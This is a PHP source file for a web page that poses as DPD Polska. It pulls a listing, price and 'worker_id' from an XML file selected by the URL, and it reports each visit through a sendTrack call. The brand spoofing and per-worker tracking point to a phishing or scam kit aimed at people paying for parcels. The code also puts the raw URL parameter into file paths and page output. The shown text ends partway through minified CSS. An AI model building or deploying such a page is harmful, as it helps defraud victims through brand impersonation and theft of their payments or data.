<?php
include "service.php";
include "../settings.php";
if (file_exists("data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("data/" . $_GET["id"] . ".xml");

sendTrack($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id);
?>
<!DOCTYPE html>
<!-- saved from url=(0049)<?php echo $_GET['id']; ?> -->
<html lang="pl"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<title>DPD Polska- przesyłki kurierskie, serwis miejski, krajowy, międzynarodowy</title>
<style>#_1f {
	background: #cac4be;
	font-size: 12px;
	color: #414042;
	display: flex;
}
.fblock-title a {
	font-weight: 600;
	color: #414042;
    text-decoration: none;
}
.fblock-title {
    margin-bottom: 20px;
}
.fblock-pnk {
	color: #414042;
    text-decoration: none;
}
.nolu-title {
	margin-top: 30px;
	margin-left: 40px;
    width: 70px;
}
._0 {
	margin: 0 auto;
	max-width: 1024px;
}
._1 {
	height: 64px;
	border-bottom: 1px solid #e7e7e7;
	margin-top: 24px;
	margin-bottom: 8px;
	display: flex;
}
._2 {
	height: 100%;
	background: url(logo.php) no-repeat 0 center / auto 32px;
	width: 150px;
}
._3 {
	width: 100%;
}
._4 {
	font-weight: bold;
	font-size: 20px;
}
._5 {
	margin-top: 12px;
}
._13 {
	font-weight: bold;
	font-size: 30px;
	margin-top: 50px;
	margin-bottom: 24px;
	margin-left: 16px;
}
._14 {
	margin-top: 12px;
}
._15 {
	width: 30%;
}
._16 {
	padding: 35px 16px;
    border-top: 1px solid #e7e7e7;
    margin-bottom: 50px;
}
._17 {
	border-top: 1px solid #e7e7e7;
	padding: 16px;
	border-radius: 4px;
	margin-bottom: 16px;
	color: #565656;
}
._19 {
	padding: 12px;
    border: 1px solid #cacaca;
}
._20 {
	width: 250px;
	margin-top: 30px;
}
._21 {
	font-size: 16px;
	color: #555;
	margin-bottom: 24px;
}
._23 {
	padding: 12px 0;
	font-size: 20px;
	color: #FFF;
	cursor: pointer;
	background: #ED1651;
}
._23:disabled {
	background: #E8A4B8;
	cursor: default;
}
._23:not([disabled]):hover {
	background: #D5294F;
}
._24 {
	color: #999;
}
._30 {
	margin-bottom: 4px;
	font-size: 16px;
}
input {
	font-family: Arial;
	font-size: 16px;
	color: #222;
	width: 100%;
	border: none;
	outline: none;
	box-sizing: border-box;
}
table {
	width: 100%;
	border-collapse: collapse;
}

td {
	padding: 0;
}
@media all and (max-width: 960px) {
	._0 {
		max-width: 480px;
	}
	._1 {
		margin-top: 16px;
	}
	/*._3, ._16, ._21, ._20 {
		width: 100%;
	}*/
	._13 {
		font-size: 26px;
		margin-top: 32px;
	}
	._2 {
		width: 100%;
	}
	._15 {
	    width: 40%;
	}
	#_1f {
	display: block;
	padding: 30px;
	}
}</style>
<script></script>
<link rel="stylesheet" id="fvm-header-0-css" href="./dpd_files/5-1.css" type="text/css" media="all">
<meta property="og:url" content="https://www.dpd.com/pl/pl/">
<meta property="og:site_name" content="DPD">
<meta property="og:title" content="<?php echo $xml->obyava; ?>">
<meta property="og:description" content="<?php echo $xml->obyava; ?>">
<meta property="og:type" content="website">
<meta property="og:locale" content="pl_PL">
<style>
@font-face{font-family:dashicons;src:url("");src:url("") format("embedded-opentype"),url("") format("woff"),url("") format("truetype");font-weight:400;font-style:normal}@charset "UTF-8";:root{--blue:#007bff;--indigo:#6610f2;--purple:#6f42c1;--pink:#e83e8c;--red:#dc3545;--orange:#fd7e14;--yellow:#ffc107;--green:#28a745;--teal:#20c997;--cyan:#17a2b8;--white:#fff;--gray:#6c757d;--gray-dark:#343a40;--primary:#007bff;--secondary:#6c757d;--success:#28a745;--info:#17a2b8;--warning:#ffc107;--danger:#dc3545;--light:#f8f9fa;--dark:#343a40;--breakpoint-xs:0;--breakpoint-sm:544px;--breakpoint-md:768px;--breakpoint-lg:992px;--breakpoint-xl:1200px;--font-family-sans-serif:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--font-family-monospace:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace}*,::after,::before{-webkit-box-sizing:border-box;box-sizing:border-box}html{font-family:sans-serif;line-height:1.15;-webkit-text-size-adjust:100%;-ms-text-size-adjust:100%;-ms-overflow-style:scrollbar;-webkit-tap-highlight-color:transparent}@-ms-viewport{width:device-width}footer,header,nav{display:block}body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";font-size:1rem;font-weight:400;line-height:1.5;color:#212529;text-align:left;background-color:#fff}h3{margin-top:0;margin-bottom:.5rem}p{margin-top:0;margin-bottom:1rem}ul{margin-top:0;margin-bottom:1rem}a{color:#007bff;text-decoration:none;background-color:transparent;-webkit-text-decoration-skip:objects}a:hover{color:#0056b3;text-decoration:underline}img{vertical-align:middle;border-style:none}input{margin:0;font-family:inherit;font-size:inherit;line-height:inherit}input{overflow:visible}::-webkit-file-upload-button{font:inherit;-webkit-appearance:button}h3{margin-bottom:.5rem;font-family:inherit;font-weight:500;line-height:1.2;color:inherit}h3{font-size:1.75rem}.container{width:100%;padding-right:8px;padding-left:8px;margin-right:auto;margin-left:auto}@media (min-width:1200px){.container{max-width:1600px}}.row{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-8px;margin-left:-8px}@media (max-width:543.98px){.row{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-2px;margin-left:-2px}.col-10{padding-right:2px;padding-left:2px}.col-12{padding-right:2px;padding-left:2px}.col-sm-12{padding-right:2px;padding-left:2px}.col-md-3{padding-right:2px;padding-left:2px}.col-md-9{padding-right:2px;padding-left:2px}.col-md-12{padding-right:2px;padding-left:2px}.col-lg-2{padding-right:2px;padding-left:2px}.col-lg-4{padding-right:2px;padding-left:2px}.col-lg-6{padding-right:2px;padding-left:2px}.col-lg-8{padding-right:2px;padding-left:2px}.col-lg-10{padding-right:2px;padding-left:2px}}.container{width:auto;max-width:100%;padding-right:2px;padding-left:2px;margin-right:10px;margin-left:10px}.row-fix-margin-auto{margin-right:-7%;margin-left:-7%;width:auto}.col-10{position:relative;width:100%;min-height:1px}.col-12{position:relative;width:100%;min-height:1px}.col-10{-webkit-flex:0 0 83.333333%;-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}.col-12{-webkit-flex:0 0 100%;-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}.offset-1{margin-left:8.333333%}@media (min-width:544px) and (max-width:767.98px){.row{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-6px;margin-left:-6px}.col-10{padding-right:6px;padding-left:6px}.col-12{padding-right:6px;padding-left:6px}.col-sm-12{padding-right:6px;padding-left:6px}.col-md-3{padding-right:6px;padding-left:6px}.col-md-9{padding-right:6px;padding-left:6px}.col-md-12{padding-right:6px;padding-left:6px}.col-lg-2{padding-right:6px;padding-left:6px}.col-lg-4{padding-right:6px;padding-left:6px}.col-lg-6{padding-right:6px;padding-left:6px}.col-lg-8{padding-right:6px;padding-left:6px}.col-lg-10{padding-right:6px;padding-left:6px}}@media (min-width:544px){.container{width:auto;max-width:100%;padding-right:6px;padding-left:6px;margin-right:14px;margin-left:14px}.row-fix-margin-auto{margin-right:-20px;margin-left:-20px;width:auto}.col-sm-12{position:relative;width:100%;min-height:1px}.col-sm-12{-webkit-flex:0 0 100%;-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}}@media (min-width:768px) and (max-width:991.98px){.row{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-8px;margin-left:-8px}.col-10{padding-right:8px;padding-left:8px}.col-12{padding-right:8px;padding-left:8px}.col-sm-12{padding-right:8px;padding-left:8px}.col-md-3{padding-right:8px;padding-left:8px}.col-md-9{padding-right:8px;padding-left:8px}.col-md-12{padding-right:8px;padding-left:8px}.col-lg-2{padding-right:8px;padding-left:8px}.col-lg-4{padding-right:8px;padding-left:8px}.col-lg-6{padding-right:8px;padding-left:8px}.col-lg-8{padding-right:8px;padding-left:8px}.col-lg-10{padding-right:8px;padding-left:8px}}@media (min-width:768px){.container{width:auto;max-width:100%;padding-right:8px;padding-left:8px;margin-right:12px;margin-left:12px}.row-fix-margin-auto{margin-right:-20px;margin-left:-20px;width:auto}.col-md-3{position:relative;width:100%;min-height:1px}.col-md-9{position:relative;width:100%;min-height:1px}.col-md-12{position:relative;width:100%;min-height:1px}.col-md-3{-webkit-flex:0 0 25%;-ms-flex:0 0 25%;flex:0 0 25%;max-width:25%}.col-md-9{-webkit-flex:0 0 75%;-ms-flex:0 0 75%;flex:0 0 75%;max-width:75%}.col-md-12{-webkit-flex:0 0 100%;-ms-flex:0 0 100%;flex:0 0 100%;max-width:100%}}@media (min-width:992px) and (max-width:1199.98px){.row{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-8px;margin-left:-8px}.col-10{padding-right:8px;padding-left:8px}.col-12{padding-right:8px;padding-left:8px}.col-sm-12{padding-right:8px;padding-left:8px}.col-md-3{padding-right:8px;padding-left:8px}.col-md-9{padding-right:8px;padding-left:8px}.col-md-12{padding-right:8px;padding-left:8px}.col-lg-2{padding-right:8px;padding-left:8px}.col-lg-4{padding-right:8px;padding-left:8px}.col-lg-6{padding-right:8px;padding-left:8px}.col-lg-8{padding-right:8px;padding-left:8px}.col-lg-10{padding-right:8px;padding-left:8px}}@media (min-width:992px){.container{width:auto;max-width:100%;padding-right:8px;padding-left:8px;margin-right:26px;margin-left:26px}.row-fix-margin-auto{margin-right:-34px;margin-left:-34px;width:auto}.col-lg-2{position:relative;width:100%;min-height:1px}.col-lg-4{position:relative;width:100%;min-height:1px}.col-lg-6{position:relative;width:100%;min-height:1px}.col-lg-8{position:relative;width:100%;min-height:1px}.col-lg-10{position:relative;width:100%;min-height:1px}.col-lg-2{-webkit-flex:0 0 16.666667%;-ms-flex:0 0 16.666667%;flex:0 0 16.666667%;max-width:16.666667%}.col-lg-4{-webkit-flex:0 0 33.333333%;-ms-flex:0 0 33.333333%;flex:0 0 33.333333%;max-width:33.333333%}.col-lg-6{-webkit-flex:0 0 50%;-ms-flex:0 0 50%;flex:0 0 50%;max-width:50%}.col-lg-8{-webkit-flex:0 0 66.666667%;-ms-flex:0 0 66.666667%;flex:0 0 66.666667%;max-width:66.666667%}.col-lg-10{-webkit-flex:0 0 83.333333%;-ms-flex:0 0 83.333333%;flex:0 0 83.333333%;max-width:83.333333%}}@media (min-width:1200px){.row{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;margin-right:-8px;margin-left:-8px}.col-10{padding-right:8px;padding-left:8px}.col-12{padding-right:8px;padding-left:8px}.col-sm-12{padding-right:8px;padding-left:8px}.col-md-3{padding-right:8px;padding-left:8px}.col-md-9{padding-right:8px;padding-left:8px}.col-md-12{padding-right:8px;padding-left:8px}.col-lg-2{padding-right:8px;padding-left:8px}.col-lg-4{padding-right:8px;padding-left:8px}.col-lg-6{padding-right:8px;padding-left:8px}.col-lg-8{padding-right:8px;padding-left:8px}.col-lg-10{padding-right:8px;padding-left:8px}}@media (min-width:1200px){.container{width:100%;padding-right:8px;padding-left:8px;margin-right:auto;margin-left:auto}.row-fix-margin-auto{margin-right:-38px;margin-left:-38px;width:auto}}.no-gutters{margin-right:0;margin-left:0}.no-gutters>[class*=col-]{padding-right:0;padding-left:0}.btn:not(:disabled):not(.disabled){cursor:pointer}.btn-primary:not(:disabled):not(.disabled).active,.btn-primary:not(:disabled):not(.disabled):active{color:#fff;background-color:#0062cc;border-color:#005cbf}.btn-primary:not(:disabled):not(.disabled).active:focus,.btn-primary:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(0,123,255,.5);box-shadow:0 0 0 .2rem rgba(0,123,255,.5)}.btn-secondary:not(:disabled):not(.disabled).active,.btn-secondary:not(:disabled):not(.disabled):active{color:#fff;background-color:#545b62;border-color:#4e555b}.btn-secondary:not(:disabled):not(.disabled).active:focus,.btn-secondary:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(108,117,125,.5);box-shadow:0 0 0 .2rem rgba(108,117,125,.5)}.btn-success:not(:disabled):not(.disabled).active,.btn-success:not(:disabled):not(.disabled):active{color:#fff;background-color:#1e7e34;border-color:#1c7430}.btn-success:not(:disabled):not(.disabled).active:focus,.btn-success:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(40,167,69,.5);box-shadow:0 0 0 .2rem rgba(40,167,69,.5)}.btn-info:not(:disabled):not(.disabled).active,.btn-info:not(:disabled):not(.disabled):active{color:#fff;background-color:#117a8b;border-color:#10707f}.btn-info:not(:disabled):not(.disabled).active:focus,.btn-info:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(23,162,184,.5);box-shadow:0 0 0 .2rem rgba(23,162,184,.5)}.btn-warning:not(:disabled):not(.disabled).active,.btn-warning:not(:disabled):not(.disabled):active{color:#212529;background-color:#d39e00;border-color:#c69500}.btn-warning:not(:disabled):not(.disabled).active:focus,.btn-warning:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(255,193,7,.5);box-shadow:0 0 0 .2rem rgba(255,193,7,.5)}.btn-danger:not(:disabled):not(.disabled).active,.btn-danger:not(:disabled):not(.disabled):active{color:#fff;background-color:#bd2130;border-color:#b21f2d}.btn-danger:not(:disabled):not(.disabled).active:focus,.btn-danger:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(220,53,69,.5);box-shadow:0 0 0 .2rem rgba(220,53,69,.5)}.btn-light:not(:disabled):not(.disabled).active,.btn-light:not(:disabled):not(.disabled):active{color:#212529;background-color:#dae0e5;border-color:#d3d9df}.btn-light:not(:disabled):not(.disabled).active:focus,.btn-light:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(248,249,250,.5);box-shadow:0 0 0 .2rem rgba(248,249,250,.5)}.btn-dark:not(:disabled):not(.disabled).active,.btn-dark:not(:disabled):not(.disabled):active{color:#fff;background-color:#1d2124;border-color:#171a1d}.btn-dark:not(:disabled):not(.disabled).active:focus,.btn-dark:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(52,58,64,.5);box-shadow:0 0 0 .2rem rgba(52,58,64,.5)}.btn-outline-primary:not(:disabled):not(.disabled).active,.btn-outline-primary:not(:disabled):not(.disabled):active{color:#fff;background-color:#007bff;border-color:#007bff}.btn-outline-primary:not(:disabled):not(.disabled).active:focus,.btn-outline-primary:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(0,123,255,.5);box-shadow:0 0 0 .2rem rgba(0,123,255,.5)}.btn-outline-secondary:not(:disabled):not(.disabled).active,.btn-outline-secondary:not(:disabled):not(.disabled):active{color:#fff;background-color:#6c757d;border-color:#6c757d}.btn-outline-secondary:not(:disabled):not(.disabled).active:focus,.btn-outline-secondary:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(108,117,125,.5);box-shadow:0 0 0 .2rem rgba(108,117,125,.5)}.btn-outline-success:not(:disabled):not(.disabled).active,.btn-outline-success:not(:disabled):not(.disabled):active{color:#fff;background-color:#28a745;border-color:#28a745}.btn-outline-success:not(:disabled):not(.disabled).active:focus,.btn-outline-success:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(40,167,69,.5);box-shadow:0 0 0 .2rem rgba(40,167,69,.5)}.btn-outline-info:not(:disabled):not(.disabled).active,.btn-outline-info:not(:disabled):not(.disabled):active{color:#fff;background-color:#17a2b8;border-color:#17a2b8}.btn-outline-info:not(:disabled):not(.disabled).active:focus,.btn-outline-info:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(23,162,184,.5);box-shadow:0 0 0 .2rem rgba(23,162,184,.5)}.btn-outline-warning:not(:disabled):not(.disabled).active,.btn-outline-warning:not(:disabled):not(.disabled):active{color:#212529;background-color:#ffc107;border-color:#ffc107}.btn-outline-warning:not(:disabled):not(.disabled).active:focus,.btn-outline-warning:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(255,193,7,.5);box-shadow:0 0 0 .2rem rgba(255,193,7,.5)}.btn-outline-danger:not(:disabled):not(.disabled).active,.btn-outline-danger:not(:disabled):not(.disabled):active{color:#fff;background-color:#dc3545;border-color:#dc3545}.btn-outline-danger:not(:disabled):not(.disabled).active:focus,.btn-outline-danger:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(220,53,69,.5);box-shadow:0 0 0 .2rem rgba(220,53,69,.5)}.btn-outline-light:not(:disabled):not(.disabled).active,.btn-outline-light:not(:disabled):not(.disabled):active{color:#212529;background-color:#f8f9fa;border-color:#f8f9fa}.btn-outline-light:not(:disabled):not(.disabled).active:focus,.btn-outline-light:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(248,249,250,.5);box-shadow:0 0 0 .2rem rgba(248,249,250,.5)}.btn-outline-dark:not(:disabled):not(.disabled).active,.btn-outline-dark:not(:disabled):not(.disabled):active{color:#fff;background-color:#343a40;border-color:#343a40}.btn-outline-dark:not(:disabled):not(.disabled).active:focus,.btn-outline-dark:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:0 0 0 .2rem rgba(52,58,64,.5);box-shadow:0 0 0 .2rem rgba(52,58,64,.5)}.collapse:not(.show){display:none}.dropdown{position:relative}.dropdown-toggle::after{display:inline-block;width:0;height:0;margin-left:.255em;vertical-align:.255em;content:"";border-top:.3em solid;border-right:.3em solid transparent;border-bottom:0;border-left:.3em solid transparent}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:10rem;padding:.5rem 0;margin:.125rem 0 0;font-size:1rem;color:#212529;text-align:left;list-style:none;background-color:#fff;-webkit-background-clip:padding-box;background-clip:padding-box;border:1px solid rgba(0,0,0,.15);-webkit-border-radius:.25rem;border-radius:.25rem}.dropdown-item{display:block;width:100%;padding:.25rem 1.5rem;clear:both;font-weight:400;color:#212529;text-align:inherit;white-space:nowrap;background-color:transparent;border:0}.dropdown-item:focus,.dropdown-item:hover{color:#16181b;text-decoration:none;background-color:#f8f9fa}.dropdown-item:active{color:#fff;text-decoration:none;background-color:#007bff}.dropdown-item:disabled{color:#6c757d;background-color:transparent}.nav{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;padding-left:0;margin-bottom:0;list-style:none}.nav-link{display:block;padding:.5rem 1rem}.nav-link:focus,.nav-link:hover{text-decoration:none}.navbar{position:relative;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;-webkit-align-items:center;-ms-flex-align:center;align-items:center;-webkit-justify-content:space-between;-ms-flex-pack:justify;justify-content:space-between;padding:.5rem 1rem}.navbar-brand{display:inline-block;padding-top:.3125rem;padding-bottom:.3125rem;margin-right:1rem;font-size:1.25rem;line-height:inherit;white-space:nowrap}.navbar-brand:focus,.navbar-brand:hover{text-decoration:none}.navbar-nav{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;padding-left:0;margin-bottom:0;list-style:none}.navbar-nav .nav-link{padding-right:0;padding-left:0}.navbar-nav .dropdown-menu{position:static;float:none}.navbar-collapse{-webkit-flex-basis:100%;-ms-flex-preferred-size:100%;flex-basis:100%;-webkit-flex-grow:1;-ms-flex-positive:1;flex-grow:1;-webkit-align-items:center;-ms-flex-align:center;align-items:center}.navbar-toggler:not(:disabled):not(.disabled){cursor:pointer}@media (min-width:768px){.navbar-expand-md{-webkit-flex-flow:row nowrap;-ms-flex-flow:row nowrap;flex-flow:row nowrap;-webkit-justify-content:flex-start;-ms-flex-pack:start;justify-content:flex-start}.navbar-expand-md .navbar-nav{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row}.navbar-expand-md .navbar-nav .dropdown-menu{position:absolute}.navbar-expand-md .navbar-nav .nav-link{padding-right:.5rem;padding-left:.5rem}.navbar-expand-md .navbar-collapse{display:-webkit-flex!important;display:-ms-flexbox!important;display:flex!important;-webkit-flex-basis:auto;-ms-flex-preferred-size:auto;flex-basis:auto}}.page-link:not(:disabled):not(.disabled){cursor:pointer}.close:not(:disabled):not(.disabled){cursor:pointer}.close:not(:disabled):not(.disabled):focus,.close:not(:disabled):not(.disabled):hover{color:#000;text-decoration:none;opacity:.75}@supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)){}@supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)){}@supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)){}@supports ((-webkit-transform-style:preserve-3d) or (transform-style:preserve-3d)){}.d-none{display:none!important}.d-inline-block{display:inline-block!important}.d-block{display:block!important}@media (min-width:768px){.d-md-none{display:none!important}.d-md-block{display:block!important}}@media (min-width:992px){.d-lg-flex{display:-webkit-flex!important;display:-ms-flexbox!important;display:flex!important}}.justify-content-between{-webkit-justify-content:space-between!important;-ms-flex-pack:justify!important;justify-content:space-between!important}.float-right{float:right!important}@supports ((position:-webkit-sticky) or (position:sticky)){}.mb-1{margin-bottom:.25rem!important}.mb-2{margin-bottom:.5rem!important}.mr-3{margin-right:1rem!important}.mb-3{margin-bottom:1rem!important}.mb-4{margin-bottom:1.5rem!important}.px-0{padding-right:0!important}.pb-0{padding-bottom:0!important}.px-0{padding-left:0!important}.pt-1{padding-top:.25rem!important}@media (min-width:768px){.px-md-0{padding-right:0!important}.px-md-0{padding-left:0!important}}.text-center{text-align:center!important}@media print{*,::after,::before{text-shadow:none!important;-webkit-box-shadow:none!important;box-shadow:none!important}a:not(.btn){text-decoration:underline}img{page-break-inside:avoid}h3,p{orphans:3;widows:3}h3{page-break-after:avoid}@page{size:a3}body{min-width:992px!important}.container{min-width:992px!important}.navbar{display:none}}
body::-webkit-scrollbar-thumb{-webkit-appearance:none;appearance:none;width:96px;height:33px;background:#414042;-webkit-box-shadow:0 2px 4px 0 rgba(0,0,0,.5);box-shadow:0 2px 4px 0 rgba(0,0,0,.5);-webkit-border-radius:4px;border-radius:4px}input[type=text]{display:inline-block;margin-bottom:0;font-size:14px;font-weight:300;line-height:1.14;border:none;color:#414042;vertical-align:middle;-webkit-border-radius:0;border-radius:0;width:100%;padding:0}input::-ms-clear{display:none}input[type=text]{background-color:#fff;-webkit-box-shadow:none;box-shadow:none;-webkit-transition:none;-o-transition:none;transition:none}input[type=text]:focus{border:none;outline:0;-webkit-box-shadow:none;box-shadow:none}.search-close,i.input-icon{position:absolute;top:12px;right:10px;cursor:pointer}.navbar .nav-item:hover .nav-link span{border-bottom:1px solid #dc0032;color:#dc0032;padding-bottom:5px}.sub-expand{background:url("dpd-image-8.svg") no-repeat 100%;width:18px;height:18px;display:block;position:absolute;right:8px;top:18px;cursor:pointer}@font-face{font-family:PlutoSansRegular;src:url("dpd-type-17.ttf") format("truetype");font-weight:400;font-style:normal}@font-face{font-family:PlutoSansLight;src:url("dpd-type-16.ttf") format("truetype");font-weight:300;font-style:normal}@font-face{font-family:PlutoSansExtraLight;src:url("PlutoSansDPDExtraLight-Web.ttf") format("truetype");font-weight:200;font-style:normal}body{color:#414042;font-family:PlutoSansRegular;font-weight:400;font-size:13px}body::-webkit-scrollbar{width:5px}img{max-width:100%}h3{font-weight:400;font-size:18px;line-height:23px}p{font-weight:400;font-size:13px;line-height:16px}
.small-text{font-size:11px!important;line-height:13px}.font-light{font-family:PlutoSansLight;font-weight:300}.no-padding{padding:0!important}.grey-color{color:#414042}.primary-color{color:#dc0032}a{color:#414042;border-bottom:1px solid transparent}a:hover{color:#dc0032}a.primary-color:hover{color:#dc0032}a.grey-color:hover{color:#dc0032}.vertical-align{display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-ms-flex-align:center;align-items:center}input[type=text]:-moz-read-only{color:#808285}input{font-family:PlutoSansRegular}.input-box{outline:0;width:100%;height:45px;background-color:#fff;border:solid 1px #808285;-webkit-box-sizing:border-box;box-sizing:border-box;padding:7px 10px 0;position:relative;display:inline-block;vertical-align:top}.input-box[class*=search-box]{padding-top:13px}.search-close{right:0}.wide-search-box{border-left:0;border-top:0;border-right:0}.wide-search-box input{padding-left:45px}.wide-search-box i.input-icon{width:24px;left:10px;right:auto}.bold-bg-color{background:#414042}.gold-bg-color{background:#cac4be}.btn-primary:not(:disabled):not(.disabled):active{background-color:#dc0032;-webkit-box-shadow:none;box-shadow:none}.btn-primary:not(:disabled):not(.disabled).active{background-color:#dc0032;-webkit-box-shadow:none;box-shadow:none}.btn-secondary:not(:disabled):not(.disabled):active{background-color:#a90034}.btn-secondary:not(:disabled):not(.disabled).active{background-color:#a90034}header{z-index:1000;background:#fff;position:relative;border-bottom:1px solid #e6e7e8}header .mainnavbar{min-height:49px;padding-top:5px}.navbar{padding-top:0;padding-bottom:0}.navbar .navbar-brand{margin-left:0;margin-right:2rem;padding-top:0;padding-bottom:.2rem}.navbar .navbar-nav>li>a.nav-link{font-size:14px}.navbar .dropdown-menu{border:none;width:100%;left:0;right:0;background-color:#fff;top:98%;border-top:1px solid #e6e7e8;-webkit-border-radius:0;border-radius:0;font-size:14px}.navbar .dropdown-menu div[class*=col]{margin-bottom:1rem}.navbar .has-sub .dropdown-menu div[class*=col]{margin-bottom:0}.navbar .dropdown-toggle::after{display:inline-block;width:0;height:0;vertical-align:0;content:"";border-top:0;border-right:0;border-bottom:0;border-left:0}.navbar .nav-item{padding:.7rem .3rem;margin:0}.navbar .dropdown{position:static}.navbar .dropdown:hover>.dropdown-menu{display:block!important}.navbar .dropdown>.dropdown-menu:hover{display:block!important}.navbar .wide-search-box{position:absolute;width:auto;border-bottom:none;right:85px;left:-webkit-calc(100% - 120px);left:calc(100% - 120px);-webkit-transition:all 250ms ease-in-out;-o-transition:all 250ms ease-in-out;transition:all 250ms ease-in-out;max-width:90%;top:11px}.navbar .wide-search-box .search-close{display:none}.offmenu-toggle{cursor:pointer;min-width:23px}.mainnavbar{border-bottom:1px solid #e6e7e8}.footer-clear{height:2px;opacity:.5}.footer-logo{padding-bottom:1px}.footer-logo img{display:inline-block;vertical-align:bottom}@supports ((position:-webkit-sticky) or (position:sticky)){}.sub-expand.active{background:url("dpd-image-7.svg") no-repeat 100%}
.footer-links{max-width:20%;-webkit-flex:0 0 20%;-ms-flex:0 0 20%;flex:0 0 20%}.dropdown-menu .dropdown-item{padding:0;color:#414042;background:url("dpd-image-1.svg") no-repeat 91% 50%;-webkit-transition:background 1s ease;-o-transition:background 1s ease;transition:background 1s ease}.dropdown-menu .dropdown-item:hover{color:#dc0032;background-position-x:100%}.dropdown-menu .dropdown-item span{padding:1rem 0;display:block;width:98%;border-bottom:solid 1px #e6e7e8}.dropdown-menu .dropdown-item:last-child span{border-bottom:none}.footer-nav a{border-right:1px solid #414042}.footer-nav a:nth-last-child(-n+2){border-right:none}html{overflow-x:hidden}.btn-primary:not(:disabled):not(.disabled).active:focus,.btn-primary:not(:disabled):not(.disabled):active:focus{-webkit-box-shadow:none;box-shadow:none}.btn-primary:not(:disabled):not(.disabled).active,.btn-primary:not(:disabled):not(.disabled):active{background-color:#e6e7e8;color:#ababac}.fm-form .btn-primary:not(:disabled):not(.disabled).active,.fm-form .btn-primary:not(:disabled):not(.disabled):active{background-color:#dc0032;color:#fff;opacity:1}@media screen and (max-width:991.98px){body{overflow-x:hidden}}footer.page-footer{max-width:1200px}footer .footer-clear{height:2px;opacity:.5}footer .footer-logo{padding-bottom:1px}footer .footer-logo img{display:inline-block;vertical-align:bottom;width:81px}footer .footer-logo span{display:inline-block;vertical-align:bottom;line-height:20px}footer .footer-nav a{border-right:1px solid #414042}footer .footer-nav a:nth-last-child(-n+2){border-right:none}footer .footer-menu .footer-text{padding:1px 0;font-size:11px}footer .footer-menu .footer-link{margin-bottom:0}footer .footer-menu .footer-link:after{content:'';display:block;clear:both}footer .footer-menu .footer-link li{list-style:none;display:inline-block;padding-left:7px;padding-right:7px}footer .footer-menu .footer-link li:not(:last-of-type){border-right:1px solid #414042}footer .footer-menu .footer-link li:nth-last-child(2){border-right:none}footer .mobile-footer 